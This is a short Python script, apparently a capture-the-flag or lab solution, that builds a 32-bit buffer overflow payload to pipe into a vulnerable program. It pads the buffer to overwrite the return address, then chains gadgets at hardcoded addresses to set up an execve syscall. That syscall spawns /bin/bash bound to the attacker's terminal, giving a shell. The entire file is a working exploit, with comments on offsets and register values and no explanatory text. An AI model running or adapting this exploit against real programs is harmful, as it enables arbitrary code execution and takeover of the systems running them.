# usage : tty | python3 payload.py | <vulnerable program>

import sys

tty = input()
stri = "/bin/bash " + "< "+tty

str ="/bin/bash".encode() #buffer+0
str+=b'\x00'
str+="-c".encode() #buffer+13
str+=b'\x00'
str+=stri.encode()
str+=b'\x00'
i=len(str)
print(i)
str+=b'\x00'*(44-i)
str+=b'\xa1\x89\x04\x08' #mov eax, [esp + 0x4]; ret  (ret dir overflow and program flow takeover)
str+=b'\x8f\x8d\x04\x08' #mov edx,[esp+0x24]; mov ecx,[esp+0x28];...;mov ebx,[esp+0x20];...;call gs:0x10 (int 80)
str+=b'\x0b\x00\x00\x00' #eax = 11 -> execve    	(esp +0x0)
str+=b'\x00\x00\x00\x00' #				(esp +0x4)
str+=b'\x00\x00\x00\x00' # value to mov into esi	(esp +0x8)
str+=b'\xe0\xf0\xef\xff' # execve argv[0]		(esp +0xc)
str+=b'\xea\xf0\xef\xff' # argv[1]			(esp +0x10)
str+=b'\xed\xf0\xef\xff' #				(esp +0x14)
str+=b'\x00\x00\x00\x00' #				(esp +0x18)
str+=b'\x00\x00\x00\x00' #				(esp +0x1c)
str+=b'\xe0\xf0\xef\xff' #value to mov into ebx		(esp +0x20)
str+=b'\x00\x00\x00\x00' #value to mov into edx		(esp +0x24)
str+=b'\x20\xf1\xef\xff' #value to mov into ecx		(esp +0x28)
str+=b'\x00\x00\x00\x00' #value to mov into edi		(esp +0x2c)
str+=b'\x0a'		 # \n
sys.stdout.buffer.write(str)


